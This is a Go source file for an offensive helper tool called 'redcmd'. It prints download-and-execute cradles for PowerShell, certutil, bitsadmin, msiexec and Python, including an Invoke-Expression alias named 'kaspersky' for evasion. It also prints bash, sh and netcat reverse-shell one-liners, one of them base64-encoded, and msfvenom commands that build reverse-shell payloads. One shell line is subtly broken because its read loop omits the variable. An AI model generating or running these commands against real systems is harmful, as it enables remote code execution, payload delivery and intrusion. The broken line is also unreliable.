package main

import (
	"encoding/base64"
	"fmt"
	"os"
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}

	switch os.Args[1] {
	case "download":
		if len(os.Args) != 6 {
			fmt.Fprintln(os.Stderr, "download requires: <host> <port> <source> <destination>")
			usage()
			os.Exit(2)
		}
		host, port, src, dst := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		for _, command := range []string{
			fmt.Sprintf("powershell.exe -Command \"Invoke-WebRequest -Uri http://%s:%s/%s -OutFile %s\"", host, port, src, dst),
			fmt.Sprintf("powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://%s:%s/%s')", host, port, src),
			fmt.Sprintf("certutil.exe -urlcache -split -f http://%s:%s/%s %s", host, port, src, dst),
			fmt.Sprintf("wget http://%s:%s/%s -O %s", host, port, src, dst),
			fmt.Sprintf("curl http://%s:%s/%s -o %s", host, port, src, dst),
			fmt.Sprintf("bitsadmin /rawreturn /transfer down \"http://%s:%s/%s\" c:\\%s", host, port, src, dst),
			fmt.Sprintf("msiexec /q /i http://%s:%s/%s", host, port, src),
			fmt.Sprintf("python -c \"import urllib2; exec urllib2.urlopen('http://%s:%s/%s').read();\"", host, port, src),
		} {
			fmt.Println(command)
		}
	case "revshell":
		if len(os.Args) != 4 {
			fmt.Fprintln(os.Stderr, "revshell requires: <host> <port>")
			usage()
			os.Exit(2)
		}
		host, port := os.Args[2], os.Args[3]
		bash := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", host, port)
		for _, command := range []string{
			bash,
			fmt.Sprintf("/bin/bash -i > /dev/tcp/%s/%s 0<& 2>&1", host, port),
			fmt.Sprintf("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do  2>&5 >&5; done", host, port),
			fmt.Sprintf("exec /bin/sh 0</dev/tcp/%s/%s 1>&0 2>&0", host, port),
			fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", base64.StdEncoding.EncodeToString([]byte(bash))),
			fmt.Sprintf("echo \"%s\"|bash", bash),
			fmt.Sprintf("sh -i >& /dev/udp/%s/%s 0>&1", host, port),
			fmt.Sprintf("mknod backpipe p && nc %s %s 0<backpipe | /bin/bash 1>backpipe", host, port),
			fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", host, port),
		} {
			fmt.Println(command)
		}
	case "msfshell":
		if len(os.Args) != 4 {
			fmt.Fprintln(os.Stderr, "msfshell requires: <host> <port>")
			usage()
			os.Exit(2)
		}
		host, port := os.Args[2], os.Args[3]
		for _, payload := range []string{
			"windows/meterpreter/reverse_tcp -f exe > reverse.exe",
			"windows/shell_reverse_tcp -f exe > reverse.exe",
			"windows/meterpreter/reverse_tcp -f asp > shell.asp",
			"linux/x86/meterpreter/reverse_tcp -f elf > reverse.elf",
			"linux/x86/shell_reverse_tcp -f elf > reverse.elf",
			"linux/x86/meterpreter/reverse_tcp -f elf > shell.elf",
			"osx/x86/shell_reverse_tcp -f macho > shell.macho",
			"java/jsp_shell_reverse_tcp -f raw > shell.jsp",
			"java/jsp_shell_reverse_tcp -f war > shell.war",
			"cmd/unix/reverse_python -f raw > shell.py",
			"cmd/unix/reverse_bash -f raw > shell.sh",
			"cmd/unix/reverse_perl -f raw > shell.pl",
		} {
			fmt.Printf("msfvenom -p %s LHOST=%s LPORT=%s\n", payload, host, port)
		}
	default:
		usage()
	}
}

func usage() {
	fmt.Print("Usage:\n" +
		"  redcmd download 127.0.0.1 8080 shell.exe exploit.exe\n" +
		"  redcmd revshell 127.0.0.1 4444\n" +
		"  redcmd msfshell 127.0.0.1 4444\n")
}
